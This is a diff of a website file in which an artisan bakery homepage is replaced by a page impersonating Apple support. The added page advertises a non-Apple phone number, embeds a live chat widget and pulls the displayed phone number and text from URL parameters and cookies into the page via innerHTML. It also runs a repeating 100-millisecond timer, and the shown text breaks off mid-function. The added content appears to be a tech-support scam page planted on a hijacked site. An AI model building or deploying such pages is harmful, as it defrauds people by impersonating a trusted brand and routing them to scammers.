@@ -1,527 +1,388 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Embermint Breadsmith House · Artisan Bread Authority</title>
-  <!-- Fonts & minimal icons -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      background: #fbf7f0;
-      color: #1f1e1b;
-      font-family: 'Inter', sans-serif;
-      line-height: 1.6;
-      padding: 0 1.5rem;
-    }
-    .container {
-      max-width: 1240px;
-      margin: 0 auto;
-      padding: 1.8rem 0 4rem;
-    }
-    /* unique typography & spacing */
-    h1, h2, h3, h4 {
-      font-family: 'Instrument Serif', serif;
-      font-weight: 400;
-      letter-spacing: -0.02em;
-      line-height: 1.2;
-      color: #1f1e1b;
-    }
-    h1 {
-      font-size: 3.6rem;
-      margin-bottom: 0.5rem;
-    }
-    h2 {
-      font-size: 2.6rem;
-      margin: 2.8rem 0 1.2rem;
-      border-bottom: 2px solid #dcd2c2;
-      padding-bottom: 0.4rem;
-    }
-    h3 {
-      font-size: 1.8rem;
-      margin: 2rem 0 0.8rem;
-      color: #3d352b;
-    }
-    p {
-      margin-bottom: 1.4rem;
-      font-size: 1.1rem;
-      max-width: 75ch;
-    }
-    .meta {
-      font-size: 0.9rem;
-      color: #6b5f51;
-      letter-spacing: 0.02em;
-      text-transform: uppercase;
-      border-left: 4px solid #c9b5a0;
-      padding-left: 0.8rem;
-      margin: 1rem 0 1.8rem;
-    }
-    a {
-      color: #7d5f44;
-      text-decoration: none;
-      border-bottom: 1px dotted #c9b5a0;
-    }
-    a:hover {
-      color: #3d2c1f;
-      border-bottom: 1px solid #7d5f44;
-    }
-    /* header / nav */
-    .site-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: baseline;
-      padding: 1.2rem 0 1.8rem;
-      border-bottom: 1px solid #e3d7ca;
-      flex-wrap: wrap;
-    }
-    .brand {
-      font-family: 'Instrument Serif', serif;
-      font-size: 2.2rem;
-      letter-spacing: -0.02em;
-      color: #2b231c;
-    }
-    .brand small {
-      font-size: 1rem;
-      font-family: 'Inter', sans-serif;
-      font-weight: 300;
-      color: #6b5f51;
-      margin-left: 0.6rem;
-    }
-    .nav-links {
-      display: flex;
-      gap: 2.2rem;
-      font-weight: 400;
-      font-size: 1rem;
-      color: #3d352b;
-    }
-    .nav-links a {
-      border-bottom: none;
-    }
-    /* hero */
-    .hero {
-      padding: 2.8rem 0 2.2rem;
-    }
-    .hero-grid {
-      display: grid;
-      grid-template-columns: 2fr 1fr;
-      gap: 3rem;
-      align-items: start;
-    }
-    .hero h1 {
-      font-size: 4rem;
-      line-height: 1.1;
-    }
-    .hero-sub {
-      font-size: 1.3rem;
-      color: #3d352b;
-      max-width: 65ch;
-      margin: 1.2rem 0 1.8rem;
-    }
-    .hero-tags {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.6rem 1rem;
-      margin-top: 1.4rem;
-      font-weight: 500;
-      color: #4d3f31;
-    }
-    .hero-tags span {
-      background: #e9dfd2;
-      padding: 0.2rem 1rem;
-      border-radius: 30px;
-      font-size: 0.9rem;
-    }
-    .hero-img {
-      background: #dcd2c2;
-      padding: 0.8rem;
-      border-radius: 28px 8px 28px 8px;
-    }
-    .hero-img img {
-      width: 100%;
-      height: auto;
-      display: block;
-      border-radius: 20px 4px 20px 4px;
-    }
-    /* cards */
-    .card-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-      gap: 2.2rem;
-      margin: 2.2rem 0;
-    }
-    .card {
-      background: #fffcf8;
-      border-radius: 24px 8px 24px 8px;
-      padding: 1.8rem 1.6rem;
-      box-shadow: 0 8px 18px -10px rgba(0,0,0,0.08);
-      transition: 0.2s;
-      border: 1px solid #ede5da;
-    }
-    .card:hover {
-      background: #fff9f2;
-      border-color: #d4c3b0;
-    }
-    .card h3 {
-      font-size: 1.6rem;
-      margin-top: 0.2rem;
-      margin-bottom: 0.4rem;
-    }
-    .card .excerpt {
-      font-size: 1rem;
-      color: #3f3730;
-    }
-    .card .tag {
-      font-size: 0.75rem;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      color: #7d6b59;
-      border: 1px solid #d4c3b0;
-      padding: 0.1rem 0.8rem;
-      border-radius: 20px;
-      display: inline-block;
-    }
-    /* category pills */
-    .category-pills {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.8rem 1.8rem;
-      margin: 1.8rem 0 0.8rem;
-    }
-    .category-pills a {
-      background: #ece2d6;
-      padding: 0.2rem 1.6rem;
-      border-radius: 40px;
-      font-weight: 500;
-      border-bottom: none;
-      color: #2b231c;
-    }
-    .category-pills a:hover {
-      background: #dccfc0;
-    }
-    /* inline featured image */
-    .featured-inline {
-      display: flex;
-      gap: 2rem;
-      background: #f3ede6;
-      border-radius: 28px 8px 28px 8px;
-      padding: 1.6rem 2rem;
-      margin: 2.4rem 0;
-      align-items: center;
-      flex-wrap: wrap;
-    }
-    .featured-inline img {
-      width: 160px;
-      border-radius: 16px 4px 16px 4px;
-      background: #c9b5a0;
-    }
-    .featured-inline div {
-      flex: 1;
-    }
-    .featured-inline h3 {
-      margin-top: 0;
-    }
-    /* table & checklist */
-    .table-wrap {
-      background: #f3ede6;
-      border-radius: 20px 4px 20px 4px;
-      padding: 1.8rem 2rem;
-      margin: 2rem 0;
-      overflow-x: auto;
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 1rem;
-    }
-    th {
-      text-align: left;
-      padding: 0.8rem 0.4rem 0.4rem 0;
-      font-weight: 600;
-      border-bottom: 2px solid #b7a692;
-    }
-    td {
-      padding: 0.8rem 0.4rem 0.8rem 0;
-      border-bottom: 1px solid #dacfc1;
-    }
-    .checklist {
-      list-style: none;
-      margin: 1.6rem 0;
-    }
-    .checklist li {
-      padding: 0.6rem 0 0.6rem 2.2rem;
-      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="%237d5f44" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>') left center no-repeat;
-      background-size: 1.2rem;
-      margin-bottom: 0.2rem;
-    }
-    .faq-item {
-      margin: 1.6rem 0;
-      border-bottom: 1px solid #e3d7ca;
-      padding-bottom: 1.2rem;
-    }
-    .faq-item h4 {
-      font-family: 'Inter', sans-serif;
-      font-weight: 600;
-      font-size: 1.2rem;
-      margin-bottom: 0.2rem;
-    }
-    .faq-item p {
-      margin-bottom: 0.2rem;
-      color: #2b231c;
-    }
-    .newsletter {
-      background: #2b231c;
-      color: #f3ede6;
-      padding: 3rem 2.5rem;
-      border-radius: 40px 8px 40px 8px;
-      margin: 3.2rem 0;
-    }
-    .newsletter h2 {
-      color: #f3ede6;
-      border-bottom: 2px solid #6b5f51;
-      padding-bottom: 0.4rem;
-      margin-top: 0;
-    }
-    .newsletter input {
-      padding: 0.8rem 1.2rem;
-      border: none;
-      border-radius: 60px;
-      font-size: 1rem;
-      width: 260px;
-      background: #f3ede6;
-      color: #1f1e1b;
-    }
-    .newsletter button {
-      background: #c9b5a0;
-      border: none;
-      padding: 0.8rem 2.2rem;
-      border-radius: 60px;
-      font-weight: 600;
-      font-size: 1rem;
-      margin-left: 0.6rem;
-      color: #1f1e1b;
-      cursor: pointer;
-    }
-    footer {
-      border-top: 1px solid #dcd2c2;
-      padding-top: 2.8rem;
-      margin-top: 2.8rem;
-      display: flex;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      font-size: 0.95rem;
-      color: #5b4f42;
-    }
-    @media (max-width: 800px) {
-      .hero-grid {
-        grid-template-columns: 1fr;
-      }
-      .site-header {
-        flex-direction: column;
-        gap: 0.8rem;
-      }
-      .nav-links {
-        flex-wrap: wrap;
-        gap: 1rem;
-      }
-      h1 { font-size: 2.8rem; }
-    }
-    /* minimal images: only 3-4 used */
-    .infographic-placeholder {
-      background: #e3d7ca;
-      padding: 1.2rem 1.8rem;
-      border-radius: 28px 4px 28px 4px;
-      font-weight: 500;
-      color: #2b231c;
-      margin: 2rem 0;
-      display: inline-block;
-    }
-  </style>
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+
+
+
+
+
+	<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-6cfbZTytOxFzT_D8G_htA.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+<script>
+  const domain = window.location.hostname;
+  const s = document.createElement("script");
+  s.defer = true;
+  s.setAttribute("data-domain", domain);
+  s.src = "https://plausible.io/js/script.js";
+  document.head.appendChild(s);
+</script><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
 </head>
+
 <body>
-<div class="container">
-
-  <!-- header -->
-  <header class="site-header">
-    <div class="brand">Embermint Breadsmith <small>·House</small></div>
-    <div class="nav-links">
-     <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li>
-    </div>
-  </header>
-
-  <!-- HERO -->
-  <section class="hero">
-    <div class="hero-grid">
-      <div>
-        <h1>Bread · fire · flour · patience</h1>
-        <p class="hero-sub">The Embermint Breadsmith House is a sanctuary for bakers who seek depth, crust, and crumb. From wild fermentation to hearth baking — we document the craft.</p>
-        <div class="hero-tags">
-          <span>#sourdough</span>
-          <span>#hearthbread</span>
-          <span>#fermentation</span>
-          <span>#scoring</span>
-          <span>#hydration</span>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-      </div>
-      <div class="hero-img">
-        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='280' viewBox='0 0 400 280'%3E%3Crect width='400' height='280' fill='%23b7a692'/%3E%3Ccircle cx='200' cy='140' r='80' fill='%23dccfc0'/%3E%3Cpath d='M120 120 L160 90 L200 120 L240 90 L280 120 L260 180 L140 180 L120 120' fill='%23c9b5a0'/%3E%3C/svg%3E"
-             alt="Artisan bread hearth" width="400" height="280">
-      </div>
-    </div>
-  </section>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-  <!-- FEATURED ARTICLES (card grid) -->
-  <h2>Featured articles</h2>
-  <div class="card-grid">
-    <div class="card">
-      <span class="tag">Sourdough</span>
-      <h3>The 100% hydration myth</h3>
-      <div class="excerpt">Why stiff starters build better flavor, and how to adjust your feeding routine for a robust culture.</div>
-    </div>
-    <div class="card">
-      <span class="tag">Baking science</span>
-      <h3>Steam, spring & oven glow</h3>
-      <div class="excerpt">Mastering the first 5 minutes of baking: steam injection, scoring depth, and radiant heat.</div>
-    </div>
-    <div class="card">
-      <span class="tag">Guide</span>
-      <h3>Whole wheat · ancient grains</h3>
-      <div class="excerpt">Spelt, einkorn, and rye: hydration adjustments, fermentation times, and handling tips.</div>
-    </div>
-  </div>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-833-497-3164 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-  <!-- BEGINNER GUIDES + EXPERT RESOURCES (inline) -->
-  <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin: 2.8rem 0;">
-    <div style="background: #f3ede6; padding: 2rem; border-radius: 28px 4px 28px 4px;">
-      <h3 style="margin-top: 0;">Beginner’s hearth</h3>
-      <p>Start here: flour, water, salt, and time. Our <strong>5-day sourdough starter</strong> guide walks you through every bubble and fold.</p>
-      <ul style="list-style: none; padding-left: 0;">
-        <li style="padding: 0.2rem 0;">→ Day 1: mixing & resting</li>
-        <li style="padding: 0.2rem 0;">→ Day 2: first feed</li>
-        <li style="padding: 0.2rem 0;">→ Day 3: peak activity</li>
-        <li style="padding: 0.2rem 0;">→ Day 4: leaven build</li>
-        <li style="padding: 0.2rem 0;">→ Day 5: bake day</li>
-      </ul>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
-    <div style="background: #ede5da; padding: 2rem; border-radius: 28px 4px 28px 4px;">
-      <h3 style="margin-top: 0;">Expert resources</h3>
-      <p>For the seasoned baker: hydration calculators, fermentation tables, and <strong>microclimate management</strong> for your proofing box.</p>
-      <div class="category-pills" style="margin-top: 0.4rem;">
-        <a href="#">hydration tool</a>
-        <a href="#">ferment chart</a>
-        <a href="#">dough temp</a>
-      </div>
-    </div>
-  </div>
 
-  <!-- POPULAR CATEGORIES + TRENDING -->
-  <h2>Popular categories</h2>
-  <div class="category-pills">
-    <a href="#">Sourdough</a>
-    <a href="#">Rye & dark</a>
-    <a href="#">Focaccia</a>
-    <a href="#">Baguette</a>
-    <a href="#">Whole grain</a>
-    <a href="#">Enriched dough</a>
-  </div>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-833-497-3164
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
-  <div style="display: flex; flex-wrap: wrap; gap: 2.4rem; margin: 2.4rem 0;">
-    <div style="flex: 1; min-width: 220px;">
-      <h3>Trending topics</h3>
-      <ul style="list-style: none; padding: 0;">
-        <li style="padding: 0.4rem 0;">🔥 Overnight cold ferment</li>
-        <li style="padding: 0.4rem 0;">🔥 Autolyse vs. fermentolyse</li>
-        <li style="padding: 0.4rem 0;">🔥 High-hydration handling</li>
-        <li style="padding: 0.4rem 0;">🔥 Dutch oven vs. steel</li>
-      </ul>
-    </div>
-    <div style="flex: 2; min-width: 260px;">
-      <h3>Latest articles</h3>
-      <ul style="list-style: none; padding: 0;">
-        <li style="padding: 0.4rem 0; border-bottom: 1px solid #e3d7ca;">The art of scoring: patterns that bloom</li>
-        <li style="padding: 0.4rem 0; border-bottom: 1px solid #e3d7ca;">Rye sourdough: when to add caraway</li>
-        <li style="padding: 0.4rem 0; border-bottom: 1px solid #e3d7ca;">Tartine vs. no-knead: which method wins?</li>
-      </ul>
-    </div>
-  </div>
 
-  <!-- IN-DEPTH TUTORIAL (featured article with image) -->
-  <div class="featured-inline">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160' viewBox='0 0 160 160'%3E%3Crect width='160' height='160' fill='%23b7a692'/%3E%3Ccircle cx='80' cy='80' r='45' fill='%23dccfc0'/%3E%3Cpath d='M60 50 L100 50 L100 80 L60 80' fill='%23c9b5a0'/%3E%3C/svg%3E" alt="tutorial">
-    <div>
-      <h3>In-depth tutorial: perfect sourdough crumb</h3>
-      <p>Step-by-step from levain to loaf. We dissect bulk fermentation, coil folds, and shaping for an open, lacy crumb. Includes a checklist for each stage.</p>
-      <ul class="checklist" style="margin: 0.4rem 0;">
-        <li>Levain build (1:5:5)</li>
-        <li>Autolyse 60 min</li>
-        <li>3 coil folds, 30 min apart</li>
-        <li>Bulk rise 70% volume increase</li>
-        <li>Pre-shape & bench rest</li>
-      </ul>
-    </div>
-  </div>
 
-  <!-- RESOURCE HUB: TABLE + INFOGRAPHIC (only 4th image) -->
-  <h2>Resource hub</h2>
-  <div class="table-wrap">
-    <table>
-      <tr><th>Hydration</th><th>Flour type</th><th>Ferment time</th><th>Bake temp</th></tr>
-      <tr><td>70%</td><td>Bread flour</td><td>4h bulk</td><td>230°C</td></tr>
-      <tr><td>80%</td><td>High-extraction</td><td>5h bulk</td><td>240°C</td></tr>
-      <tr><td>90%</td><td>Whole wheat</td><td>6h bulk</td><td>220°C</td></tr>
-    </table>
-  </div>
-  <div class="infographic-placeholder">
-    📊 infographic: fermentation temperature × time (optimal window 24-26°C)
-  </div>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-  <!-- FAQ -->
-  <h2>Frequently asked questions</h2>
-  <div class="faq-item">
-    <h4>Why is my sourdough not rising?</h4>
-    <p>Check starter activity, water temperature, and bulk fermentation time. Use the float test.</p>
-  </div>
-  <div class="faq-item">
-    <h4>Can I use whole wheat flour in any recipe?</h4>
-    <p>Yes, but adjust hydration by 5-10% and allow longer autolyse. Whole grains absorb more water.</p>
-  </div>
-  <div class="faq-item">
-    <h4>What is the best scoring depth?</h4>
-    <p>¼ to ½ inch, at a 30° angle. This creates an ear and controls oven spring.</p>
-  </div>
 
-  <!-- NEWSLETTER -->
-  <div class="newsletter">
-    <h2>Get the Embermint letter</h2>
-    <p style="color: #dccfc0; max-width: 60ch;">Weekly bread wisdom, fermentation notes, and hearth stories. No spam, just flour.</p>
-    <div style="display: flex; flex-wrap: wrap; gap: 0.8rem; margin-top: 1rem;">
-      <input type="email" placeholder="your email" value="hello@baker.com">
-      <button>Subscribe</button>
-    </div>
-  </div>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-  <!-- FOOTER -->
-  <footer>
-    <div>© Embermint Breadsmith House · 2026</div>
-    <div style="display: flex; gap: 1.8rem;">
-      <a href="#">About</a>
-      <a href="#">Contact</a>
-      <a href="#">Privacy</a>
-      <a href="#">Archives</a>
-    </div>
-  </footer>
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
 
-</div>
-</body>
-</html>
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-833-497-3164');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
